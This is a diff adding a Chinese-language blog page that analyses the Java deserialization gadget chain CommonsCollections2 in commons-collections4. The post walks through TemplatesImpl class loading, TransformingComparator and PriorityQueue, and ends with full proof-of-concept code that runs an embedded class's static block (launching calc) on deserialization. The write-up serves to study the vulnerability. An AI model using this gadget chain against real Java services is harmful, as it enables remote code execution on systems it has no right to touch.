@@ -1,0 +1,655 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="self_209&#39;blog">
+    <title>java反序列化Commons Collections(二) - self_209&#39;blog</title>
+    <meta name="author" content="self_209">
+    
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"本文继续CommonsCollections2  Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现代码执行。\n\n\n \n\n漏洞环境：\njava：Java SE 8 Development Kit 8u65\ncommons-collections：4.0\ngradle：implementation group: ‘org.apache.commons’, name: ‘commons-collections4’, version: ‘4.0’\nGadget chain：\n123456789101112Gadget chain:\tObjectInputStream.readObject()\t\tPriorityQueue.readObject()\t\tPriorityQueue.heapify()\t\tPriorityQueue.siftDown()\t\tPriorityQueue.siftDownUsingComparator()\t\t\tTransformingComparator.compare()\t\t\t\tInvokerTransformer.transform()        \t\t\tTemplatesImpl.newTransformer()        \t\t\tTemplatesImpl.getTransletInstance()        \t\t\tTemplatesImpl.defineTransletClasses()        \t\t\tTemplatesImpl.defineClass()//将 byte 字节解析成虚拟机能够识别的Class对象。\n\n类加载java类加载\n类的加载连接和初始化\n当 Java程序中需要使用到某个类时，虚拟机会保证这个类已经被加载、连接和初始化。而连接又包含验证、准备和解析这三个子过程，这个过程必须严格按照顺序执行。\n类的加载\n通过类的完全限定名（包名和类名）查找此类的字节码文件，把类的.class文件中的二进制数据读入到内存中，并存放在运行时数据区的方法区内，然后利用字节码文件创建一个Class对象，用来封装类在方法区内的数据结构并存放在堆区内。这个过程是由类加载器完成的，我们后面会进行详细讲解。\n连接\n\n验证：确保被加载类的正确性。class 文件的字节流中包含的信息符合当前虚拟机要求，不会危害虚拟机自身的安全。\n\n准备：为类的静态变量分配内存，并将其设置为默认值。此阶段仅仅只为静态类变量（即 static 修饰的字段变量）分配内存，并且设置该变量的初始值。（比如 static int num = 5，这里只将 num 初始化为0，5的值将会在初始化时赋值）。对于 final static 修饰的变量，编译的时候就会分配了，也不会分配实例变量的内存。\n\n解析：把类中的符号引用转换为直接引用。符号引用就是一组符号来描述目标，而直接引用就是直接指向目标的指针。相对偏移量或一个间接定位到目标的句柄。（可参考”虚拟机指令”相关内容）\n\n\n初始化\n类加载最后阶段，若该类具有父类，则先对父类进行初始化，执行静态变量赋值和静态代码块代码，成员变量也将被初始化。\n利用类加载代码执行类加载器（除了根类加载器）都必须继承java.lang.ClassLoader。ClassLoader下有一个defineClass方法，它是将 byte 字节解析成虚拟机能够识别的Class对象。\nTransletClassLoader\n12345678910111213141516171819202122232425262728293031323334353637public final class TemplatesImpl implements Templates, Serializable &#123;        static final class TransletClassLoader extends ClassLoader &#123;            private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;             TransletClassLoader(ClassLoader parent) &#123;                 super(parent);                _loadedExternalExtensionFunctions = null;            &#125;            TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;                super(parent);                _loadedExternalExtensionFunctions = mapEF;            &#125;            public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;                Class&lt;?&gt; ret = null;                // The _loadedExternalExtensionFunctions will be empty when the                // SecurityManager is not set and the FSP is turned off                if (_loadedExternalExtensionFunctions != null) &#123;                    ret = _loadedExternalExtensionFunctions.get(name);                &#125;                if (ret == null) &#123;                    ret = super.loadClass(name);                &#125;                return ret;             &#125;            /**             * Access to final protected superclass member from outer class.             */            Class defineClass(final byte[] b) &#123;                return defineClass(null, b, 0, b.length);            &#125;        &#125;        &#125;\n\nTemplatesImpl.defineClass()在TemplatesImpl类中自定义了类加载器，并且定义了defineClass方法接收byte字节数组，返回ClassLoader.defineClass方法解析成的class对象，如果byte字节数组b我们可以控制那我们就可以返回任意类的class对象。\n123Class defineClass(final byte[] b) &#123;\treturn defineClass(null, b, 0, b.length);&#125;\n\nTemplatesImpl.defineTransletClasses()在TemplatesImpl.defineTransletClasses()方法中调用了defineClass方法，其中_tfactory不能等于null，才能顺利到loader.defineClass(_bytecodes[i]);  _tfactory被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值，他并不会影像我们的Gadget chain执行到loader.defineClass，loader.defineClass它传递一个_ bytecodes二维数组将class对象返回给_class数组，_bytecodes二维数组是私有属性，我们可以通过反射赋值，那么我们就找哪里调用了defineTransletClasses方法。\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283private transient TransformerFactoryImpl _tfactory = null;private byte[][] _bytecodes = null;private Class[] _class = null;private void defineTransletClasses()        throws TransformerConfigurationException &#123;        if (_bytecodes == null) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);            throw new TransformerConfigurationException(err.toString());        &#125;        TransletClassLoader loader = (TransletClassLoader)            AccessController.doPrivileged(new PrivilegedAction() &#123;                public Object run() &#123;                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());                &#125;            &#125;);        try &#123;            final int classCount = _bytecodes.length;            _class = new Class[classCount];            if (classCount &gt; 1) &#123;                _auxClasses = new HashMap&lt;&gt;();            &#125;            for (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();                // Check if this is the main class                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;                    _transletIndex = i;                &#125;                else &#123;                    _auxClasses.put(_class[i].getName(), _class[i]);                &#125;            &#125;            if (_transletIndex &lt; 0) &#123;                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);                throw new TransformerConfigurationException(err.toString());            &#125;        &#125;        catch (ClassFormatError e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;        catch (LinkageError e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;    &#125;private void  readObject(ObjectInputStream is)      throws IOException, ClassNotFoundException    &#123;        SecurityManager security = System.getSecurityManager();        if (security != null)&#123;            String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);            if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase(&quot;true&quot;))) &#123;                ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);                throw new UnsupportedOperationException(err.toString());            &#125;        &#125;        // We have to read serialized fields first.        ObjectInputStream.GetField gf = is.readFields();        _name = (String)gf.get(&quot;_name&quot;, null);        _bytecodes = (byte[][])gf.get(&quot;_bytecodes&quot;, null);        _class = (Class[])gf.get(&quot;_class&quot;, null);        _transletIndex = gf.get(&quot;_transletIndex&quot;, -1);        _outputProperties = (Properties)gf.get(&quot;_outputProperties&quot;, null);        _indentNumber = gf.get(&quot;_indentNumber&quot;, 0);        if (is.readBoolean()) &#123;            _uriResolver = (URIResolver) is.readObject();        &#125;        _tfactory = new TransformerFactoryImpl();    &#125;\n\nTemplatesImpl.getTransletInstance()getTransletInstance方法调用了defineTransletClasses方法，_name不等于null， _class等于null就会调用defineTransletClasses方法，newInstance创建一个实例化对象，创建实例化对象，这个过程会执行静态变量赋值和静态代码块代码，如果我们传递的byte字节数组静态代码块中有恶意代码那么在创建实例化对象时就会执行。\n1234567891011121314151617181920212223242526272829private Translet getTransletInstance()        throws TransformerConfigurationException &#123;        try &#123;            if (_name == null) return null;            if (_class == null) defineTransletClasses();            // The translet needs to keep a reference to all its auxiliary            // class to prevent the GC from collecting them            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();            translet.postInitialization();            translet.setTemplates(this);            translet.setServicesMechnism(_useServicesMechanism);            translet.setAllowedProtocols(_accessExternalStylesheet);            if (_auxClasses != null) &#123;                translet.setAuxiliaryClasses(_auxClasses);            &#125;            return translet;        &#125;        catch (InstantiationException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;        catch (IllegalAccessException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;    &#125;\n\nTemplatesImpl.newTransformer()在newTransformer方法中调用了getTransletInstance方法，并且newTransformer方法是public。\n1234567891011121314151617public synchronized Transformer newTransformer()        throws TransformerConfigurationException    &#123;        TransformerImpl transformer;        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,            _indentNumber, _tfactory);        if (_uriResolver != null) &#123;            transformer.setURIResolver(_uriResolver);        &#125;        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;            transformer.setSecureProcessing(true);        &#125;        return transformer;    &#125;\n\n当我们通过反射将_ bytecodes二维数组赋值为含有恶意代码的类的byte字节，调用newTransformer方法就会触发恶意代码。\nCodeImplement：\n1234567891011import java.io.IOException;public class CodeImplement &#123;    static &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n类加载代码执行：\n1234567891011121314151617181920212223//获取一个TemplatesImpl对象      TemplatesImpl templates = new TemplatesImpl();      //读取恶意代码的字节码      byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;));      //将字节码数组存放在二维数组中      byte[][] _bytecodes = &#123;code&#125;;      //获取TemplatesImpl的Class对象      Class c = templates.getClass();      //获取_name属性      Field name = c.getDeclaredField(&quot;_name&quot;);      name.setAccessible(true);      //将_name设置为任意      name.set(templates,&quot;ok&quot;);      //获取_bytecodes属性      Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;);      bytecodes.setAccessible(true);      //将存放恶意代码字节码的二维数组传递给_bytecodes属性      bytecodes.set(templates,_bytecodes);      //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。      Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);      tfactory.setAccessible(true);      tfactory.set(templates,new TransformerFactoryImpl());      templates.newTransformer();\n\n代码执行：\n\n发生报错，调试查看发现他会判断解析的对象的父类是不是ABSTRACT_TRANSLET常量，是的话就会把i赋值给_transletIndex，_transletIndex，默认等于-1，_transletIndex小于0就会报错，所以我们需要把存在恶意代码的类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet就能解决。\n12private static String ABSTRACT_TRANSLET = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;private int _transletIndex = -1;\n\n\nCodeImplement：\n123456789101112131415161718192021222324252627import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class CodeImplement extends AbstractTranslet&#123;    static &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;            &#125;&#125;\n\n编译成class文件，重写执行。\n\nTransformingComparator.compare()执行类与cc1一样InvokerTransformer.transform()，只不过调用的是TemplatesImpl类newTransformer方法，这里我们就直接看TransformingComparator类的compare方法。\n123456789101112131415161718public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123;\t\tprivate final Transformer&lt;? super I, ? extends O&gt; transformer;\t\t\tpublic TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,final Comparator&lt;O&gt; decorated) &#123;\t\tthis.decorated = decorated;\t\tthis.transformer = transformer;\t&#125;\t\t\tpublic int compare(final I obj1, final I obj2) &#123;\t\tfinal O value1 = this.transformer.transform(obj1);\t\tfinal O value2 = this.transformer.transform(obj2);\t\treturn this.decorated.compare(value1, value2);\t&#125;\t&#125;\n\ncompare方法调用了transformer.transform()，transformer可控，那么将InvokerTransformer传递给transformer就会调用InvokerTransformer.transform()。\n123456789101112131415161718192021222324252627282930public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123;    //获取一个TemplatesImpl对象    TemplatesImpl templates = new TemplatesImpl();    //读取恶意代码的字节码    byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;));    //将字节码数组存放在二维数组中    byte[][] _bytecodes = &#123;code&#125;;    //获取TemplatesImpl的Class对象    Class c = templates.getClass();    //获取_name属性    Field name = c.getDeclaredField(&quot;_name&quot;);    name.setAccessible(true);    //将_name设置为任意    name.set(templates,&quot;ok&quot;);    //获取_bytecodes属性    Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;);    bytecodes.setAccessible(true);    //将存放恶意代码字节码的二维数组传递给_bytecodes属性    bytecodes.set(templates,_bytecodes);    //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。    Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);    tfactory.setAccessible(true);    tfactory.set(templates,new TransformerFactoryImpl());    InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);    new TransformingComparator(newTransformer).compare(templates,&quot;templates&quot;);&#125;\n\n运行代码：\n\nPriorityQueue之后便是找什么地方调用了compare方法，来到PriorityQueue类\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123;\tprivate final Comparator&lt;? super E&gt; comparator;    private int size = 0;            \tpublic boolean offer(E e) &#123;\t\tif (e == null)\t\t\tthrow new NullPointerException();\t\tmodCount++;\t\tint i = size;\t\tif (i &gt;= queue.length)\t\t\tgrow(i + 1);\t\tsize = i + 1;\t\tif (i == 0)\t\t\tqueue[0] = e;\t\telse\t\t\tsiftUp(i, e);\t\treturn true;    &#125;            \tpublic PriorityQueue(int initialCapacity,Comparator&lt;? super E&gt; comparator) &#123;\t\t// Note: This restriction of at least one is not actually needed,\t\t// but continues for 1.5 compatibility\t\tif (initialCapacity &lt; 1)\t\t\tthrow new IllegalArgumentException();\t\tthis.queue = new Object[initialCapacity];\t\tthis.comparator = comparator;\t&#125;        \tprivate void siftDownUsingComparator(int k, E x) &#123;\t\tint half = size &gt;&gt;&gt; 1;\t\twhile (k &lt; half) &#123;\t\t\tint child = (k &lt;&lt; 1) + 1;\t\t\tObject c = queue[child];\t\t\tint right = child + 1;\t\t\tif (right &lt; size &amp;&amp;\t\t\t\tcomparator.compare((E) c, (E) queue[right]) &gt; 0)\t\t\t\tc = queue[child = right];\t\t\tif (comparator.compare(x, (E) c) &lt;= 0)\t\t\t\tbreak;\t\t\tqueue[k] = c;\t\t\tk = child;\t\t&#125;\t\tqueue[k] = x;\t&#125;\tprivate void siftDown(int k, E x) &#123;\t\tif (comparator != null)\t\t\tsiftDownUsingComparator(k, x);\t\telse\t\t\tsiftDownComparable(k, x);\t&#125;\t\tprivate void heapify() &#123;\t\tfor (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)\t\t\tsiftDown(i, (E) queue[i]);\t&#125;    \t&#125;\n\nsiftDownUsingComparator方法调用了comparator.compare(x, (E) c)，comparator可控，那么我们找在哪调用了siftDownUsingComparator方法，发现siftDown方法调用了参数x可控，那么我们找在哪调用了siftDown方法，发现在heapify方法中调用了，并且把queue[i]传递给x，那我们就要看怎么把templates赋值到queue。在offer方法当i == 0就可以把templates赋值到queue，但是当i不等于0时就会调用siftUp方法，会触发我们的调用链，所以为了它在调用offer方法的时候不触发调用链，我们在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中，利用反射在templates赋值到queue之后，再把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中。\n1234567891011121314151617181920212223242526272829303132333435363738//获取一个TemplatesImpl对象        TemplatesImpl templates = new TemplatesImpl();        //读取恶意代码的字节码        byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;));        //将字节码数组存放在二维数组中        byte[][] _bytecodes = &#123;code&#125;;        //获取TemplatesImpl的Class对象        Class c = templates.getClass();        //获取_name属性        Field name = c.getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        //将_name设置为任意        name.set(templates, &quot;ok&quot;);        //获取_bytecodes属性        Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        //将存放恶意代码字节码的二维数组传递给_bytecodes属性        bytecodes.set(templates, _bytecodes);        //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);        tfactory.setAccessible(true);        tfactory.set(templates, new TransformerFactoryImpl());//        templates.newTransformer();\t\t//利用InvokerTransformer类获取newTransformer方法。        InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);\t\t//在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));\t\t//new 一个PriorityQueue对象将transformingComparator传递给comparator属性        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.offer(templates);        priorityQueue.offer(templates);\t\t//把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中        Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass();        Field transformer = aClass.getDeclaredField(&quot;transformer&quot;);        transformer.setAccessible(true);        transformer.set(transformingComparator,newTransformer);\n\nPriorityQueue.readObject()\n在PriorityQueue.readObject方法中调用了heapify方法，所以在priorityQueue对象反序列化时就会调用heapify方法\n12345678910111213private void readObject(java.io.ObjectInputStream s throws java.io.IOException, ClassNotFoundException &#123;\t\t// Read in size, and any hidden stuff\t\ts.defaultReadObject();\t\t// Read in (and discard) array length\t\ts.readInt();\t\tqueue = new Object[size];\t\t// Read in all elements.\t\tfor (int i = 0; i &lt; size; i++)\t\t\tqueue[i] = s.readObject();\t\t// Elements are guaranteed to be in &quot;proper order&quot;, but the\t\t// spec has never explained what that might be.\t\theapify();\t&#125;\n\npoc:\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import com.sun.org.apache.xalan.internal.xsltc.trax.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Transformer;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.*;import java.net.URLClassLoader;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Comparator;import java.util.PriorityQueue;public class cc2 &#123;    public static void Serialize(Object object) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;priorityQueue.txt&quot;));        oos.writeObject(object);    &#125;    public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName));        return ois.readObject();    &#125;    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123;        //获取一个TemplatesImpl对象        TemplatesImpl templates = new TemplatesImpl();        //读取恶意代码的字节码        byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;));        //将字节码数组存放在二维数组中        byte[][] _bytecodes = &#123;code&#125;;        //获取TemplatesImpl的Class对象        Class c = templates.getClass();        //获取_name属性        Field name = c.getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        //将_name设置为任意        name.set(templates, &quot;ok&quot;);        //获取_bytecodes属性        Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        //将存放恶意代码字节码的二维数组传递给_bytecodes属性        bytecodes.set(templates, _bytecodes);        //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);        tfactory.setAccessible(true);        tfactory.set(templates, new TransformerFactoryImpl());//        templates.newTransformer();        InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.offer(templates);        priorityQueue.offer(templates);        Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass();        Field transformer = aClass.getDeclaredField(&quot;transformer&quot;);        transformer.setAccessible(true);        transformer.set(transformingComparator,newTransformer);\t\t                //Serialize(priorityQueue);        unSerialize(&quot;priorityQueue.txt&quot;)    &#125;&#125;\n\n反序列化：\n\n","dateCreated":"2021-12-29T19:15:39+08:00","dateModified":"2022-01-01T18:05:32+08:00","datePublished":"2021-12-29T19:15:39+08:00","description":"本文继续CommonsCollections2  Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现代码执行。","headline":"java反序列化Commons Collections(二)","image":[null,"467165.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2021/12/29/20211229/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2021/12/29/20211229/","keywords":"反序列化, java","thumbnailUrl":"467165.jpg"}</script>
+    <meta name="description" content="本文继续CommonsCollections2  Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="java反序列化Commons Collections(二)">
+<meta property="og:url" content="https://self209.github.io/2021/12/29/20211229/index.html">
+<meta property="og:site_name" content="self_209&#39;blog">
+<meta property="og:description" content="本文继续CommonsCollections2  Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://self209.github.io/2021/12/29/20211229/image-20220101161822156.png">
+<meta property="og:image" content="https://self209.github.io/2021/12/29/20211229/image-20220101162158209.png">
+<meta property="og:image" content="https://self209.github.io/2021/12/29/20211229/image-20220101163117299.png">
+<meta property="og:image" content="https://self209.github.io/2021/12/29/20211229/image-20220101163923719.png">
+<meta property="og:image" content="https://self209.github.io/2021/12/29/20211229/image-20220101171545700.png">
+<meta property="article:published_time" content="2021-12-29T11:15:39.000Z">
+<meta property="article:modified_time" content="2022-01-01T10:05:32.630Z">
+<meta property="article:author" content="self_209">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://self209.github.io/2021/12/29/20211229/image-20220101161822156.png">
+    
+    
+        
+    
+    
+    
+    
+        <meta property="og:image" content="https://self209.github.io/2021/12/29/20211229/467165.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2021/12/29/20211229/467165.jpg"/>
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gt5qcce6mgvuqwcgifha2ylts94nspkxjckwcuei5fxp2ypavhmsle0ivz1f.min.css">
+
+    <!--STYLES END-->
+    
+
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            self_209&#39;blog
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
+        
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/self209"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:2662686939@qq.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    "
+             style="background-image:url('/2021/12/29/20211229/467165.jpg');"
+             data-behavior="5">
+            
+                <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            java反序列化Commons Collections(二)
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2021-12-29T19:15:39+08:00">
+	
+		    12月 29, 2021
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+
+            
+        </div>
+
+            <div id="main" data-behavior="5"
+                 class="hasCover
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>本文继续CommonsCollections2  Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现代码执行。</p>
+<span id="more"></span>
+
